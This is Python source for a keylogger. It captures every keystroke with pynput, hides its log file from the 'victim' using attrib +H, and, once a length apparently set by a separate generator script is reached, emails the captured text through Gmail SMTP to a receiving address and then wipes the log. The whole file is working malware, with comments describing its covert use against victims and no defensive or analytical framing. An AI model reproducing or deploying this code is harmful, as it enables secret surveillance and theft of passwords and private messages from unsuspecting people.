from pynput.keyboard import Listener
import smtplib
import subprocess
#before the mail is sent we open the log file and replace the space with a new line so each word will be written on a new line
def send_mail():
        try:
            with open('log.txt','r') as f:
                file=f.readlines()
                l="\n".join(file)
                l=l.replace(" ", "\n")
        except FileNotFoundError:
            pass
        server=smtplib.SMTP_SSL("smtp.gmail.com",465)
        server.login("sender_mail", "sender_pass")
        server.sendmail("sender_mail", "receiver_mail",l )
        server.quit()

#######################################
def log_keystroke(key):
    key = str(key).replace("'", "")
#replacing the key names with the actual form of the key
    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'

    with open("log.txt", 'a') as f:
        #we open a log file in append mode and make it hidden from the victim
        subprocess.check_call(["attrib","+H",'log.txt'])
        with open("log.txt") as r:
            #we used the append mode to write the pressed key on the file
            f.writelines(key)
            # we used the read mode to check the length of the text that if it's equale to the required length by the user set on the generator script the log will be sended by mail
            if len(r.read())==string_length:
                send_mail()
                file=open('log.txt','w')
                #after that the log file is send it will be cleaned up 
                file.write("")
                file.close()
#########################################
#executing the log_keystroke function when a keyboard key is pressed then joined to be added to a log file
with Listener(on_press=log_keystroke) as l:
    l.join()
    